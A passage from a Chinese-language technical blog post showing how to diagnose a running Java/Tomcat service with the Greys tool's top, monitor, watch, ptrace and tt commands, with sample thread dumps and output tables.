<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;http-8080-38&quot; daemon prio=10 tid=0x00007fbcf006e000 nid=0x15f4 in Object.wait() [0x00007fbcd28a1000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p>费了一番功夫，黄花菜都凉了。</p>
<p>也有将上面的步骤写成一个脚本的，快了许多。（驼厂内部散落着各种不同版本的slow_stack.sh）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">The stack of busy(13.6%) thread(3613/0xe1d) of java pid(3292) all times():</span><br><span class="line">&quot;http-8080-13&quot; daemon prio=10 tid=0x00007fbcf001b000 nid=0xe1d in Object.wait() [0x00007fbce7f7e000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p>开源的版本也有， <a href="https://github.com/superhj1987/awesome-scripts/blob/master/docs/java.md#beer-show-busy-java-threads" rel="external nofollow noopener noreferrer" target="_blank">awesome-scripts/java.md at master · superhj1987/awesome-scripts</a></p>
<p>greys中就可以直接使用top命令来查看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;top -t 3 -d</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| ID    |  CPU%  | USR%          | STATE                | THREAD_NAME                                                                           |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #131  | 04.14% | TIMED_WAITING | CachedClock Updater  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               | Thread               | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:349)           |</span><br><span class="line">|       |        |               |                      | at : qunar.tc.common.clock.CachedClock$1.run(CachedClock.java:22)                     |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #1282 | 03.51% | WAITING       | http-8080-176        | at : java.lang.Object.wait(Native Method)                                             |</span><br><span class="line">|       |        |               |                      | at : java.lang.Object.wait(Object.java:503)                                           |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)        |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)          |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #38   | 03.26% | TIMED_WAITING | thread-monitor-task  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos |</span><br><span class="line">|       |        |               |                      |      (AbstractQueuedSynchronizer.java:2082)                                           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:1090)                                                    |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:807)                                                     |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)    |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)  |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)  |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>上面显示的就是top3占用cpu的线程</p>
<h4 id="monitor-——-监控方法的执行时间"><a href="#monitor-——-监控方法的执行时间" class="headerlink" title="monitor —— 监控方法的执行时间"></a>monitor —— 监控方法的执行时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c2 com.domain.Bean   someMethod   </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 103 ms.</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| TIMESTAMP           | CLASS              | METHOD                     | TOTAL | SUCCESS | FAIL | FAIL-RATE | AVG-RT(ms) | MIN-RT(ms) | MAX-RT(ms) |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| 2017-11-12 17:09:18 | com.domain.Bean    | someMethod                 | 4     | 4       | 0    | 00.00%    | 13.25      | 11         | 17         |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br></pre></td></tr></table></figure>
<h4 id="watch-——-全方位监控"><a href="#watch-——-全方位监控" class="headerlink" title="watch —— 全方位监控"></a>watch —— 全方位监控</h4><p>watch可以监控方法的返回值，入参，还可以根据条件筛选（是否抛出异常，响应时间等）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;watch com.domain.Bean onMessage params[0]</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 92 ms.</span><br><span class="line">&#123;&quot;messageId&quot;:&quot;171112.171542.192.168.50.191.31779.22733&quot;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tt（time-tunel）和ptrace"><a href="#tt（time-tunel）和ptrace" class="headerlink" title="tt（time tunel）和ptrace"></a>tt（time tunel）和ptrace</h4><p>先说ptrace， 这个和trace差不多， 只是可以加上<code>-t</code>将调用存储起来，可以配合<code>tt</code>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1 com.domain.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:22) cost in 163 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;process=1002;</span><br><span class="line">    `---[21,21ms]com.domain.Bean:doSend(); index=1001;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure></p>
<p><code>tt</code>:</p>
<blockquote>
<p>时间隧道命令是我在使用watch命令进行问题排查的时候衍生出来的想法。<br>watch虽然很方便和灵活，但需要提前想清楚观察表达式的拼写，这对排查问题而言要求太高，因为很多时候我们并不清楚问题出自于何方，只能靠蛛丝马迹进行猜测.<br>这个时候如果能记录下当时方法调用的所有入参和返回值、抛出的异常会对整个问题的思考与判断非常有帮助。<br>于是乎，TimeTunnel命令就诞生了。</p>
</blockquote>
<p>列出所有时间片段或显示一个时间片段的内容:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tt -l</span><br><span class="line">tt -i 1001</span><br></pre></td></tr></table></figure>
<p>内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">ga?&gt;tt -i 1001</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1001                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1002                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:30:40                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 20                                                                                                                                                     |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x55e9f734                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.domain.Bean                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | doSend                                                                                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[0] | 242996952                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[1] | [CouponBase[id=1,amount=5]                                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[2] | VoucherSendTask[appName=catalysis,batchSeriesNum=catalysis-train_give_zhoubian-HOURROOM_NEWUSER-HOURROOM,transactionId=catalysis24299695225174650HOURR] |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ | InventoryRecord[activityId=31,transactionId=catalysis24299695225174650HOURROOM242996952]                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;                                                                                 |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.service.impl.Bean.doSend(Bean.java:179)                                    |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.service.impl.Bean.sendVoucherThenGetCouponId(Bean.java:191)          |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.provider.controller.benefit.UserBenefitController.voucherSendThenGetCouponId(UserBenefitController.java: |</span><br><span class="line">|                 | 841)                                                                                                                                                   |</span><br><span class="line">|                 |         at sun.reflect.GeneratedMethodAccessor1923.invoke(null:-1)                                                                                     |</span><br><span class="line">|                 |         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)                                                       |</span><br><span class="line">|                 |         at java.lang.reflect.Method.invoke(Method.java:606)                                                                                            |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:214)                                       |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:132)                             |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:748 |</span><br><span class="line">|                 | )                                                                                                                                                      |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:689)    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83)                        |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945)                                                    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:876)                                                     |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:931)                                                  |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:833)                                                          |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)                                                                                |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:807)                                                         |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)                                                                                |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:140)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.base.trace.HttpTraceFilter.doFilter(HttpTraceFilter.java:44)                                                            |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at qunar.ServletWatcher.doFilter(ServletWatcher.java:118)                                                                                      |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)                                    |</span><br><span class="line">|                 |         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:108)                                                 |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555)                                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)                                                           |</span><br><span class="line">|                 |         at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)                                                                 |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857)                                                                  |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)                                            |</span><br><span class="line">|                 |         at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)                                                                     |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>除了使用<code>ptrace</code>保存时间片段，也可以使用<code>tt</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -t  -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 110 ms.</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |         Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure>
<p><em>同样的最好指定-n，避免高并发下造成太大影响</em></p>
<p>解决方法重载</p>
<p>tt -t *Test print params[0].length==1</p>
<p>通过制定参数个数的形式解决不同的方法签名，如果参数个数一样，你还可以这样写</p>
<p>tt -t *Test print ‘params[1].class == Integer.class’</p>
<p>解决指定参数</p>
<p>tt -t *Test print params[0].mobile==”13989838402”</p>
<p>具体的可以参见参考文档里的说明。</p>
<ul>
<li><code>tt</code>的另外一个便利之处是可以对保存的时间片主动发起一次调用</li>
</ul>
<p>和dubbo的泛化调用一样，<code>tt</code>的这个方法也可以大大降低沟通的成本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 126 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=true;priority=5;process=1005;</span><br><span class="line">    `---[1,1ms]com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener:onMessage(); index=1004;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line"></span><br><span class="line">ga?&gt;tt -i 1004 -p</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1004                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1005                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:43:15                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 1                                                                                                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x14b7937c                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | onMessage                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[0] | &#123;&quot;messageId&quot;:&quot;171112.174315.192.168.50.191.31779.22906&quot;&#125;                                                                                               |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ |                                                                                                                                                        |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=tr |</span><br><span class="line">|                 | ue;priority=5;                                                                                                                                         |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:45)             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)                                                             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)                                                                  |</span><br><span class="line">|                 |         at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)                                                                     |</span><br><span class="line">|                 |         at java.util.concurrent.FutureTask.run(FutureTask.java:262)                                                                                    |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)                                                             |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)                                                             |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">Time fragment[1004] successfully replayed.</span><br></pre></td></tr></table></figure>
